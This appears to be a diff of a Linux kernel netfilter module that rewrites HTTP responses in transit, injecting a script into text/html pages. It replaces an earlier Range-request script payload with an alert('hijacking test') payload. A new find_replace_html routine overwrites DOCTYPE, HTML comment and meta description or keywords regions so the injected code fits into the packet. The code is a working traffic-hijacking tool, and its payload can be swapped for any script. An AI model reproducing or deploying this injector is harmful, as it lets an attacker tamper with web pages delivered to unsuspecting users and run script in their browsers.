@@ -6,30 +6,42 @@
 #include <net/tcp.h>
 #include <linux/if_packet.h>
 #include <linux/skbuff.h>
-#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("songboyu");
 MODULE_DESCRIPTION("modify http payload, base on netfilter");
 MODULE_VERSION("1.0");
-// if (window.ActiveXObject) {
-// 	ajax = new ActiveXObject('Microsoft.XMLHTTP');
-// } else if (window.XMLHttpRequest) {
-// 	ajax = new XMLHttpRequest();
-// }
-char code[] = "<script>" \
-"var ajax = new XMLHttpRequest();" \
-"ajax.open('GET', window.location.href, false);" \
-"ajax.setRequestHeader('Range', 'bytes=0-%d');" \
-"ajax.onreadystatechange = function() {" \
-	"if ((ajax.readyState == 4) && (ajax.status == 206)) {" \
-	"	document.write(ajax.responseText);" \
-	"}" \
-"};" \
-"ajax.send(null);" \
-"alert('hijacking test');" \
-"</script>";
 
+// 待插入字符串
+char code[] = "<script>alert('hijacking test')</script>";
+
+int find_replace_html(char* pkg, int codeLen, char pre[], char last[], int remove){
+	int l1 = strlen(pre);
+	int l2 = strlen(last);
+	char *p1 = strstr(pkg, pre);
+	if(p1 != NULL){
+		if(remove == 0){
+			p1 += l1;
+		}
+		char *p2 = strstr(p1, last);
+		int len = (long long)p2 - (long long)p1;
+		if(p2 != NULL && len >= codeLen){
+			if(remove == 0){
+				memcpy(p1, last, l2);
+				p1 += l2;
+				memset(p1 + codeLen, ' ', len - codeLen);
+			}else{
+				memset(p1 + codeLen, ' ', len - codeLen + l2);
+			}
+			memcpy(p1, code, codeLen);
+
+			printk("%s\n",pre);
+			return 1;
+		}
+	}
+	return 0;
+}
+// 钩子函数，发送时修改请求头，接收时修改pkg
 unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
 {
 	int codeLen = strlen(code);
@@ -68,27 +80,24 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 
 				p = strstr(pkg,"Content-Type: text/html");
 				if(p == NULL)	return NF_ACCEPT;
-				
+
 				p = strstr(pkg,"Content-Encoding: deflate");
 				if(p != NULL){
-					printk("deflate\n");
+					printk("1\n");
 				}
+
 				p = strstr(pkg,"<html");
 				if(p == NULL)	return NF_ACCEPT;
-				                       
-				p = strstr(pkg,"\r\n\r\n");
-				if(p == NULL)	return NF_ACCEPT;
-				
-				p += 4;
 
-				char s[codeLen+4];
-				if(codeLen < (1000-2)){
-					snprintf(s, codeLen+2, code, codeLen+1);
-				}else if(codeLen < (10000-2) && codeLen >= (1000-2)){
-					snprintf(s, codeLen+3, code, codeLen+2);
+				if(find_replace_html(pkg, codeLen, "<!DOCTYPE html", ">", 0) ||
+					find_replace_html(pkg, codeLen, "<!doctype html", ">", 0) ||
+					find_replace_html(pkg, codeLen, "<!--", "-->", 1) ||
+					find_replace_html(pkg, codeLen, "<meta name=\"description\"", ">", 1) ||
+					find_replace_html(pkg, codeLen, "<meta name=\"keywords\"", ">", 1) ){
+					
+					return NF_ACCEPT;
 				}
-				// printk("%s\n", s);
-				memcpy(p, s, strlen(s));
+				
 			}
 		}
 	}
